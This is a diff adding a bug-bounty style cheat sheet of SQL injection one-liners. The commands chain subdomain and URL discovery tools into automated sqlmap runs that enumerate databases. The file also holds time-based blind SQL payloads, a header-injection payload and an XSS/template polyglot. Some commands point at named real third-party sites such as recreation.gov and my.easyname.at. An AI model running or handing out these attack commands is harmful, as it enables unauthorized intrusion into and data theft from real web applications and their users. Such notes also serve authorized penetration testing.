@@ -1,0 +1,80 @@
+ SQL INJECTION        SQL INJECTION          SQL INJECTION
+ 
+ waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
+ 
+  allwos give a single quote on a paramater, this might resuilt to 500 server error
+ 
+ echo https://www.recreation.gov | waybackurls | grep "?" | uro | httpx -silent > param.txt
+
+cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
+
+sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
+
+sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+
+   SQLI ONE LINER:-     SQLI ONE LINER:-     SQLI ONE LINER:-
+cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+
+grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+
+  subfinder -d site.com -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+  
+  
+  Time based SQL injection
+  cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
+ 
+ 
+ 
+ 
+  𝗧𝗶𝗺𝗲 𝗯𝗮𝘀𝗲𝗱 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗢𝗻𝗲𝗹𝗶𝗻𝗲𝗿
+
+cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
+ 
+ 
+ Always try the "\" character in login entries. It can trigger an SQL.
+
+curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
+ 
+ 
+ 
+   5 COMMAND CAN HELP TO EASILY IDENTIFY SQL INJECTION
+     Subfinder -d target.com | tee -a domain.txt
+     cat domain.txt | httpx | tee -a url.alive.txt
+     cat url.alive.txt | waybackurls | tee - a urls.check.txt
+     gf sqli urls.check >> urls.sqli.txt         //  gf url.check >> urls.sqli.txt
+     sqlmap -m urls.sqli.txt  --dbs --batch
+     
+    
+ 
+ 
+ 
+ 
+ 
+ payload 
+ 14)%20AND%20(SELECT%207415%20FROM%20(SELECT(SLEEP(10)))CwkU)%20AND%20(7515=7515
+ 
+ 
+ SQL injection Oneliner.
+ subfinder -dL domains.txt | dnsx | waybackurl | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
+findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
+
+grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
+
+    TIME-BASE SQL INJECTION
+gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
+
+ SQL Injectjon for Contact/Registration Forms .
+1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
+2. it will crawl all the links having input field
+3. select the parameter you want to test
+ 
+ '"<svg/onload=prompt(5);>{{7*7}}
+ 
+ 
+ SQL Injectjon for Contact/Registration Forms .
+
+1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
+2. it will crawl all the links having input field
+3. select the parameter you want to test
